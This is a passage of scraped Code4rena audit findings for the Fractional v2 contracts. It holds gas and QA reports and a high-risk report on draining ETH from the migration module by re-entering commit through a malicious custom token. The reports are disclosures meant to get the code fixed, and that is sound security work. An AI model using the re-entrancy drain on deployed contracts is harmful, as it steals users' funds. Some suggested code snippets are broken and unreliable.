is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );       ...         // Transfers buyout share amount to caller based on total supply         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);         uint256 buyoutShare = (tokenBalance * ethBalance) /             (totalSupply + tokenBalance);         _sendEthOrWeth(msg.sender, buyoutShare);         // Emits event for cashing out of buyout pool         emit Cash(_vault, msg.sender, buyoutShare);     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1:  [line 246](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L246) and the SLOAD 2:  [line 267](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L267)  #### Buyout.sol.redeem() : registry should be cached (saves ~97 gas) File: Buyout.sol [line 280-288](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L278-L288)  ```     function redeem(address _vault, bytes32[] calldata _burnProof) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if auction state is not inactive         (, , State current, , , ) = this.buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert InvalidState(required, current);           // Initializes vault transaction         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1 : [line 280](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L280) and the SLOAD 2 : [line 288](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L288)   #### FERC1155.sol.uri() : metadata[\\_uri] should be cached File: FERC1155.sol [line 297-298](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L291-L299)  ```     function uri(uint256 _id)         public         view         override(ERC1155, IFERC1155)         returns (string memory)     {         require(metadata[_id] != address(0), \"NO METADATA\"); @audit : SLOAD 1 metadata[_id]         return IFERC1155(metadata[_id]).uri(_id);@audit : SLOAD 2 metadata[_id]     } ``` SLOAD 1:  in the require statement [line 297](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297) costing 100 gas  SLOAD 2:  in the return statement [line 298](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L298) again costing 100gas  We can cache `metadata[_id]` in memory and read the value from memory instead of from storage    ### Help the optimizer by saving a storage variable's reference instead of repeatedly fetching migrationInfo[\\_vault][\\_proposalId] Declare a **Storage**  variable and use it instead of fetching the reference in the map repeatedly.  Instead of calling `migrationInfo[_vault][_proposalId]` everytime save it's reference like shown below and use the reference.  ```   Proposal storage proposal = migrationInfo[_vault][_proposalId]; ``` File: Migration.sol [line 454-456](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L433-L468)  ```     function migrateFractions(address _vault, uint256 _proposalId) external {               // Calculates the total ether amount of a successful proposal         uint256 totalInEth = _calculateTotal(             1 ether,             lastTotalSupply,             migrationInfo[_vault][_proposalId].totalEth,             migrationInfo[_vault][_proposalId].totalFractions         );         // Calculates balance of caller based on ether contribution         uint256 balanceContributedInEth = _calculateContribution(             totalInEth,             lastTotalSupply,             userProposalEth[_proposalId][msg.sender],             userProposalFractions[_proposalId][msg.sender]         );          // Gets the token and fraction ID of the new vault         address newVault = migrationInfo[_vault][_proposalId].newVault;         ``` In the above function, `migrationInfo[_vault][_proposalId]` is being fetched 3 times  in the following lines  1: [line 454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L454) 2: [line 455](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L455) 3: [line 466](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L466)  Something similar to my proposal has already been implemented on [line 266](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L266)   ### Cache the length of arrays in loops (saves ~6 gas per iteration) Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  The solidity compiler will always read the length of the array during each iteration. That is,     1.if it is a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929 2) for each iteration except for the first),    2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),    3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)  This extra costs can be avoided by caching the array length (in stack):  When reading the length of an array,  **sload** or **mload** or **calldataload** operation is only called once and subsequently replaced by a cheap **dupN** instruction. Even though mload , calldataload and dupN have the same gas cost, mload and calldataload needs an additional dupN to put the offset in the stack, i.e., an extra 3 gas. which brings this to 6 gas   Here, I suggest storing the array\u2019s length in a variable before the for-loop, and use it instead:  File: MerkleBase.sol [line 51](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51)  ```             for (uint256 i = 0; i < _proof.length; ++i) { ```  **The above should be modified to** ```      uint256 length = _proof.length;             for (uint256 i = 0; i < length; ++i) { ```  **Other instances to modify** File: MerkleBase.sol [line 110](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L110)  ```             for (uint256 i; i < result.length; ++i) { ```  File: BaseVault.sol [line 64](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L64)  ```         for (uint256 i = 0; i < _tokens.length; ) { ```  File: BaseVault.sol [line 83](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L83)  ```         for (uint256 i = 0; i < _tokens.length; ) { ```  File: BaseVault.sol [line 107](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L107)  ```             for (uint256 i = 0; i < _tokens.length; ++i) { ```  File: BaseVault.sol  [line 130](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L130)  ```             for (uint256 i; i < _modules.length; ++i) { ```  File: BaseVault.sol  [line 132](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L132)  ```                 for (uint256 j; j < leaves.length; ++j) { ```  File: Buyout.sol [line 454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454)  ```         for (uint256 i; i < permissions.length; ) { ```  File: MerkleBase.sol [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L78)  The following shows all instances where `_data.length` is being accessed in the function **getProof()**  ```         require(_data.length > 1, \"wont generate proof for single leaf\"); ``` ```         uint256 size = log2ceil_naive(_data.length); ``` ```         while (_data.length > 1) { ``` ```        } else if (_node + 1 == _data.length) { ```  ### ++i costs less gas compared to i++ or i += 1  (~5 gas per iteration)  ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  i++ increments i and returns the initial value of i. Which means:  ``` uint i = 1;   i++; // == 1 but i == 2   ```  But ++i returns the actual incremented value:  ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  **Instances include:** File: Vault.sol  [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)  ```         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         } ```  The above should be modified to:  ```         for (uint256 i = 0; i < length; {             methods[_selectors[i]] = _plugins[i];   unchecked{    ++i;    }         } ```  File: Vault.sol [line 104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)  ```         for (uint256 i = 0; i < length; i++) { ```  ### use shorter revert strings(less than 32 bytes)  Every reason string takes at least 32 bytes so make sure your string fits in 32 bytes or it will become more expensive.  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  File: MerkleBase.sol [line 62](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L62)  ```         require(_data.length > 1, \"wont generate root for single leaf\"); ```  **Other instances to modify** File MerkleBase.sol [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L78)  ```         require(_data.length > 1, \"wont generate proof for single leaf\"); ```  I su"}, {"title": "Migration Module: Re-enter `commit` using custom token", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/576", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L207-L212   # Vulnerability details  ## Impact  HIGH - Assets can be compromised directly. One can drain eth out from migration module to buyout module using custom made FERC1155 token.  ## Proof of Concept  - [proof of concept: `testCommitReenter_poc`](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L283-L339) - [custom made FERC1155 for the attack](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L6-L63)  The proof of concept shows a scenario where alice is draining migration module using custom made FERC1155 token.  1. setup: other people are using migration module and they deposited some eth. (using alice and bob just to simplify the set up process) 2. alice prepared the custom FERC1155 (let's say `evil_token`) 3. alice create a vault with the `evil_token` 4. alice proposes and joins with 0.5 ether 5. when alice calls `commit`, the `evil_token` will reenter `commit` and send money to buyout module  Note: For a simplicity, the `evil_token` reenters for a fixed number of times. But one can adjust to drain all the eth in the migration module. Note2: For now the eth is in the buyout module, but given the current implementation of `buyout` module, the same actor can drain eth from buyout.  The `commit` function is not written in Checks, Effects, Interactions (CEI) patterns.   ```solidity // modules/Migration.sol::commit // proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor) // Mitigation idea: set the values before the out going calls  206         if (currentPrice > proposal.targetPrice) { 207             // Sets token approval to the buyout contract 208             IFERC1155(token).setApprovalFor(address(buyout), id, true); 209             // Starts the buyout process 210             IBuyout(buyout).start{value: proposal.totalEth}(_vault); 211             proposal.isCommited = true; 212             started = true; 213         } ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Follow Checks, Effects, Interactions patterns. One can also consider adding reentrancy guard.      "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/569", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "### 1. Unused interface imports  - The interfaces `(IERC1155, IERC20, IERC1155)` imported in [`Transfer.sol`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L4-L6) is not used anywhere inside the contract.   ### 2. Address(0) checks  - It is best practice to add guard checks for address(0) in important settings like constructors. - [BaseVault.sol#L25](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L25) - [Minter.sol#L18](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L18)  ### 3. Unhandeled return value - It is recommended to add `require()` to the boolean return values.  - [execute()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L60) returns boolean values.    ### 4. Unused receive() function will lock ether in contract  - https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53    ### 5. Less external call be made by calling the token contract's methods directly  - In [start()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L57) function of `Buyout.sol`, while calulating `totalSupply` of vault `IVaultRegistry(registry).totalSupply(_vault)`.  This could be calculated directly by calling `FERC1155(token).totalSupply(id)` directly which will make one less external call.   ```solidity  // before (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); .... uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ....   // After  .... (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); ......... uint256 totalSupply = IERC1155(token).totalSupply(id);   ```   ### 6. Defined error is not used  - [`error MethodNotFound()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVault.sol#L11) in `IVault.sol` is not used in the inherited contracts.    ### 7. Use a single modifier instead of using the same guard checks multiple times - [`if (owner != msg.sender) revert NotOwner(owner, msg.sender)`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87) is used in multiple methods inside `vault.sol`. It is recommended to use a single modifer for better code resue.   ### 8. Use two-step process for transfering ownership  - Unrecoverable critical process like [`transferOwnership()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) could use two step process to prevent unintended mistakes.  - same for [`transferController()`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229) -  First, nominate the address, and second accept the nomination from that address ensuring that the access is indeed secured.  ### 9. Use modifier to check the vault status - There are several instances where a function needs to revert unless the vault is at a certain state. This code is repeated throught several functions. - This can be refactored into a single modifier to make the code look nice and more readable.  for eg. ```solidity      modifier vaultState(address _vault, State required) {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );         if (id == 0) revert NotVault(_vault);         // Reverts if auction state is not successful         (, , State current, , , ) = this.buyoutInfo(_vault);         if (current != required) revert InvalidState(required, current);     } ```  Now this modifier can be used in any function that needs to check the vault is in a certain state before performing certain actions.  for eg, lets use function `porpose` of `Migration.sol`  ```solidity     function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external vaultState(_vault, State.INACTIVE) {     ...     ...     }"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/561", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "# [G-01] Redundant zero initialization  Solidity does not recognize null as a value, so uint variables are initialized to zero. Setting a uint variable to zero is redundant and can waste gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L83 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L107 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L51  ## Recommended Mitigation Steps  Remove the redundant zero initialization `uint256 i;` instead of `uint256 i = 0;`  # [G-02] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L83 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L107 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L130 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L132  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-03] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L186  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-04] Short require strings save gas  Strings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L62  ## Recommended Mitigation Steps  Shorten all require strings to less than 32 characters  # [G-05] Use prefix not postfix in loops  Using a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L339 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L363 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104  ## Recommended Mitigation Steps  Use prefix not postfix to increment in a loop  # [G-06] Use calldata instead of memory for function arguments  Using calldata instead of memory for function arguments saves gas sometimes. This can happen when a function is called externally and the memory array values are kept in `calldata` and copied to `memory` during ABI decoding (using the opcode `calldataload` and `mstore`). If the array is used in a for loop, `arr[i]` accesses the value in memory using a `mload`. If calldata is used instead, then instead of going via memory, the value is directly read from `calldata` using `calldataload`. That is, there are no intermediate memory operations that carries this value.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Minter.sol#L24 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L450 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L487 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L73 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L101 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L61 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L73 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L125 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L112 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L114 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IBuyout.sol#L123 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L100 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IModule.sol#L8 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L49 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L29  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#use-calldata-instead-of-memory-for-function-parameters  ## Recommended Mitigation Steps  Change function arguments from memory to calldata  # [G-07] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L339 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L363 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L78 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L104  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-08] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L59 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L64 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L154 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L189 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L249 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L256 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L281 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L320 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L352 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L388 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L425 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L82 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L114 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L146 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L187 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L299 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L436 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L276 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L124 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L136 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Multicall.sol#L23 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L42 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L120  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-09] Save gas with unchecked  Use unchecked math when there is no overflow risk to save gas. Before index is decreased in remove it is checked for zero condition. This means index will not underflow and can be unchecked.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L86-L87  ## Recommended Mitigation Steps  Add unchecked around math that can't overflow for gas savings. In Solidity before 0.8.0, use the normal math operators instead of safe math functions.  # [G-10] Add payable to constructors that won't receive ETH  Identifying a constructor as payable saves gas. Constructors should only be called by the admin or deployer and should not mistakenly receive ETH. Constructors can be payable to save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/protoforms/BaseVault.sol#L24 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Minter.sol#L17 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L42 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L53 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L8 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Metadata.sol#L16 https://github.com/code-423n4/2022-07-fractional/tree/main/src/references/SupplyReference.sol#L15 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultRegistry.sol#L28 https://github.com/code-423n4/2022-07-fractional/tree/main/src/VaultFactory.sol#L20 https://github.com/code-423n4/2022-07-fractional/tree/main/src/targets/Supply.sol#L16  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-11] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L37 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L45  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-12] Use uint not bool  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L102 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L148 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L189 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L328 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L353 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L53 https://github.com/code-423n4/2022-07-fractional/tree/main/src/Vault.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/constants/Permit.sol#L11 https://github.com/code-423n4/2022-07-fractional/tree/main/src/constants/Permit.sol#L16 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SafeSend.sol#L20 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/Multicall.sol#L18 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SelfPermit.sol#L21 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/SelfPermit.sol#L48 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L26 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L32 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L98 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L140 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IMigration.sol#L143 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L40 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L84 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L94 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IFERC1155.sol#L117 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IVault.sol#L45 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC721.sol#L14 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC721.sol#L47 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L9 https://github.com/code-423n4/2022-07-fractional/tree/main/src/interfaces/IERC1155.sol#L52  ## Recommended Mitigation Steps  Replace bool variables with uints  # [G-13] Use Solidity errors instead of require  Solidity errors introduced in version 0.8.4 can save gas on revert conditions https://blog.soliditylang.org/2021/04/21/custom-errors/ https://twitter.com/PatrickAlphaC/status/1505197417884528640  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L263 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L275 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L297 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L62 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L78  ## Recommended Mitigation Steps  Replace require blocks with new solidity errors described in https://blog.soliditylang.org/2021/04/21/custom-errors/  # [G-14] Bitshift for divide by 2  When multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.  There is a divide by 2 operation on these lines https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L100 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L136 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L142  ## Recommended Mitigation Steps  Bitshift right by one bit instead of dividing by 2 to save gas  # [G-15] Non-public variables save gas  Many constant variables are public, but changing the visibility of these variables to private or internal can save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L15 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L17 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L35 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L37 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L43  ## Recommended Mitigation Steps  Declare some public variables as private or internal to save gas  # [G-16] Write contracts in 